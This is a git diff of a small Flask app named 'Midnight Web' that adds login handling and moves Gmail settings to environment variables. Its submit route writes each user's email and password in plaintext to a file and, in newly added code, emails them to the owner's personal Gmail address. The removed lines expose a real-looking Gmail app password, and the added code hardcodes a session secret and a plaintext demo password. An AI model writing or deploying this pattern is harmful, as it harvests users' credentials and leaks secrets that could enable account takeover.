@@ -1,17 +1,80 @@
-from flask import Flask, render_template_string, request, redirect
+from flask import Flask, render_template, render_template_string, request, redirect
+from flask_login import LoginManager, login_user, logout_user, login_required, UserMixin, current_user
+
 from flask_mail import Mail, Message
+from dotenv import load_dotenv
+import os
+
+load_dotenv()  # Loads variables from .env into environment
 
 app = Flask(__name__)
-app = Flask(__name__)
+app.secret_key = 'Midnight-Loner'  # Required for session handling
+
+login_manager = LoginManager()
+login_manager.login_view = "login"
+login_manager.init_app(app)
+# Temporary in-memory user model
+class User(UserMixin):
+    def __init__(self, id, email, password):
+        self.id = id
+        self.email = email
+        self.password = password
+
+# Just for demo – this would normally come from a database
+users = {
+    "user@example.com": User(id="1", email="user@example.com", password="password123")
+}
+@login_manager.user_loader
+def load_user(user_id):
+    for user in users.values():
+        if user.id == user_id:
+            return user
+    return None
+
+
+from flask_login import login_user
+
+@app.route("/login", methods=["GET", "POST"])
+def login():
+    if request.method == "POST":
+        email = request.form["email"]
+        password = request.form["password"]
+
+        user = users.get(email)
+        if user and user.password == password:
+            login_user(user)  # ✅ Log in the user
+            return redirect("/dashboard")  # ✅ After login, go to dashboard
+        else:
+            return "Invalid email or password", 401  # ❌ Login failed
+
+    return render_template("login.html")
+
+from flask_login import login_required, current_user
+
+from flask_login import login_required, current_user
+
+@app.route("/dashboard")
+@login_required
+def dashboard():
+    return render_template("dashboard.html")
+
+
+@app.route("/logout")
+@login_required
+def logout():
+    logout_user()
+    return redirect("/login")
+
+
 
 # === Gmail Mail Configuration ===
-app.config['MAIL_SERVER'] = 'smtp.gmail.com'
-app.config['MAIL_PORT'] = 587
-app.config['MAIL_USE_TLS'] = True
-app.config['MAIL_USERNAME'] = 'isiemmanuel83@gmail.com'      # ← Replace with your Gmail
-app.config['MAIL_PASSWORD'] = 'pnug hohi kqze bhyq'         # ← Replace with the App Password
-app.config['MAIL_DEFAULT_SENDER'] = 'isiemmanuel83@gmail.com'
-from flask_mail import Mail, Message
+app.config['MAIL_SERVER'] = os.getenv('MAIL_SERVER')
+app.config['MAIL_PORT'] = int(os.getenv('MAIL_PORT'))
+app.config['MAIL_USE_TLS'] = os.getenv('MAIL_USE_TLS') == 'True'
+app.config['MAIL_USERNAME'] = os.getenv('MAIL_USERNAME')
+app.config['MAIL_PASSWORD'] = os.getenv('MAIL_PASSWORD')
+app.config['MAIL_DEFAULT_SENDER'] = os.getenv('MAIL_DEFAULT_SENDER')
+
 mail = Mail(app)
 
 # HTML template with embedded form
@@ -77,10 +140,28 @@ def submit():
     email = request.form["email"]
     password = request.form["password"]
 
+    # Save to file
     with open("submitted_data.txt", "a", encoding="utf-8") as f:
         f.write(f"Email: {email}, Password: {password}\n")
 
+    # ✅ Send confirmation email to the user
+    msg_to_user = Message(
+        subject="Welcome to Midnight Web",
+        recipients=[email],
+        body="🕶️ You've entered the shadows. Stay informed from the darkness."
+    )
+    mail.send(msg_to_user)
+
+    # ✅ Send alert email to yourself
+    msg_to_you = Message(
+        subject="New Midnight Web Signup",
+        recipients=["isiemmanuel83@gmail.com"],
+        body=f"Someone just signed up:\nEmail: {email}\nPassword: {password}"
+    )
+    mail.send(msg_to_you)
+
     return redirect("/success")
+
 
 @app.route("/success")
 def success():
